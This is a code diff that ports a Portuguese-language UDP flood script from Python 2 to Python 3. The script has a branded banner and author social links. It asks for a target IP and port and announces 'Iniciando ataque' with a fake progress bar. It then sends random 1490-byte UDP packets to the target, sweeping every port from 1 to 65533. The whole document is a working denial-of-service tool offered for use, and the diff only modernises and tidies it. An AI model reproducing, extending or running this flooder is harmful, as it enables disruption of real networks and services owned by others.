@@ -1,53 +1,38 @@
-#!/usr/bin/python
-import sys                    ### Biblioteca de argumentos
-import os
-import time                   ### Bliblioteca de tempo
-import socket                 ### Biblioteca para fazer o socket
-import random                 ### Bliblioteca para gerar aleatorio
+import time
+import socket
+import random
+from datetime import datetime as dt
 
-print "    _________   ____________  ____________________  __"
-print "   / ____/   | / ____/  _/ / /_  __/ ____/ ____/ / / /"
-print "  / /_  / /| |/ /    / // /   / / / __/ / /   / /_/ / "
-print " / __/ / ___ / /____/ // /___/ / / /___/ /___/ __  /  "
-print "/_/   /_/  |_\____/___/_____/_/ /_____/\____/_/ /_/   "
-print"                                                       "
-#Nesse momento vamos coletar os dados de tempo
-from datetime import datetime
-now = datetime.now()
-hour = now.hour
-minute = now.minute
-day = now.day
-month = now.month
-year = now.year
+banner = '''
+    _________   ____________  ____________________  __
+   / ____/   | / ____/  _/ / /_  __/ ____/ ____/ / / /
+  / /_  / /| |/ /    / // /   / / / __/ / /   / /_/ /
+ / __/ / ___ / /____/ // /___/ / / /___/ /___/ __  /
+/_/   /_/  |_\____/___/_____/_/ /_____/\____/_/ /_/
+Author   : Eduardo Amaral
+You Tube : https://www.youtube.com/faciltech
+github   : https://github.com/Amaroca
+Facebook : https://www.facebook.com/faciltech123
+'''
 
-############## Vamos fazer aqui o socket ##################
+print(banner)
+
+ip = input('Digite o IP do Alvo: ')
+port = input('Digite a Porta: ')
+print('Iniciando ataque.')
+for progress in range(0, 101, 25):
+    bar = '=' * int(progress/5)
+    print('[%s] %s' % (bar, progress), '%')
+    time.sleep(1)
+
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
-#############
-
-print "Author   : Eduardo Amaral"
-print "You Tube : https://www.youtube.com/faciltech"
-print "github   : https://github.com/Amaroca"
-print "Facebook : https://www.facebook.com/faciltech123"
-print
-ip = raw_input("Digite o IP do Alvo : ")
-port = input("Digite a Porta       : ")
-print "Iniciando ataque."
-print "[                    ] 0% "
-time.sleep(5)
-print "[=====               ] 25%"
-time.sleep(5)
-print "[==========          ] 50%"
-time.sleep(5)
-print "[===============     ] 75%"
-time.sleep(5)
-print "[====================] 100%"
-time.sleep(3)
 sent = 0
-while True:
-     sock.sendto(bytes, (ip,port))
-     sent = sent + 1
-     port = port + 1
-     print "Enviando %s pacotes to %s para a porta:%s"%(sent,ip,port)
-     if port == 65534:
-       port = 1
+before = dt.now()
+for port in range(1, 65534):
+    bytes = random._urandom(1490)
+    sock.sendto(bytes, (ip, port))
+    sent = sent + 1
+    print('Enviando pacote nº %s para %s:%s' % (sent, ip, port))
+
+elapsed = dt.now() - before
+print('Tempo de execucao:', elapsed)
